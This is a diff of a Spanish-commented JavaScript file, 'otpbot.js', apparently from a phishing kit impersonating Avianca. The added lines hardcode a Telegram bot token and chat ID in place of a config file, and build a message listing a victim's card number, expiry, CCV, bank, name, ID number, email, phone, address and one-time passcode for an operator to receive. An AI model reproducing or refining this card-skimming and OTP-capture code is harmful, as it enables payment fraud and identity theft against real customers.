@@ -1,4 +1,4 @@
-// otpbot.js - versión corregida y comentada
+// otpbot.js - versión sin claves.json
 
 document.addEventListener("DOMContentLoaded", () => {
     const btnNextStep = document.getElementById("btnNextStep");
@@ -40,10 +40,28 @@ document.addEventListener("DOMContentLoaded", () => {
         }
 
         const transactionId = Date.now().toString();
-        const config = await loadConfig();
-        if (!config) return;
 
-        const mensaje = `✈️ <b>Avianca</b> ✈️\n💳 Tarjeta: <code>${pagoavianca.card}</code>\n🗓️ Fecha: <code>${pagoavianca.card_date}</code>\n💳 CCV: <code>${pagoavianca.ccv}</code>\n🏦 Banco: <code>${pagoavianca.bank}</code>\n📅 Cuotas: <code>${pagoavianca.cuotas}</code>\n👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>\n👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>\n💳 CC: <code>${pagoavianca.cc}</code>\n📨 Correo: <code>${pagoavianca.email}</code>\n📲 Teléfono: <code>${pagoavianca.phone}</code>\n🏙️ Ciudad: <code>${pagoavianca.city}</code>\n🗽 Provincia: <code>${pagoavianca.state}</code>\n🧭 Dirección: <code>${pagoavianca.address}</code>\n🔑 OTP: <code>${otp}</code>`;
+        // ✅ Config directamente en el script:
+        const config = {
+            botToken: " 7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y ",
+            chatId: "-4644294739"
+        };
+
+        const mensaje = `✈️ <b>Avianca</b> ✈️
+💳 Tarjeta: <code>${pagoavianca.card}</code>
+🗓️ Fecha: <code>${pagoavianca.card_date}</code>
+💳 CCV: <code>${pagoavianca.ccv}</code>
+🏦 Banco: <code>${pagoavianca.bank}</code>
+📅 Cuotas: <code>${pagoavianca.cuotas}</code>
+👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>
+👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>
+💳 CC: <code>${pagoavianca.cc}</code>
+📨 Correo: <code>${pagoavianca.email}</code>
+📲 Teléfono: <code>${pagoavianca.phone}</code>
+🏙️ Ciudad: <code>${pagoavianca.city}</code>
+🗽 Provincia: <code>${pagoavianca.state}</code>
+🧭 Dirección: <code>${pagoavianca.address}</code>
+🔑 OTP: <code>${otp}</code>`;
 
         const keyboard = {
             inline_keyboard: [
@@ -84,25 +102,6 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     });
 });
-
-async function loadConfig() {
-    try {
-        const response = await fetch("./claves.json");
-        if (!response.ok) throw new Error("No se pudo cargar claves.json");
-        const config = await response.json();
-
-        if (!config.botToken || !config.chatId) {
-            console.error("❌ Token o Chat ID no definidos en claves.json");
-            return null;
-        }
-
-        console.log("🔑 Config cargada:", config);
-        return config;
-    } catch (error) {
-        console.error("❌ Error al cargar claves.json:", error);
-        return null;
-    }
-}
 
 async function checkPaymentVerification(transactionId, messageId, config) {
     try {
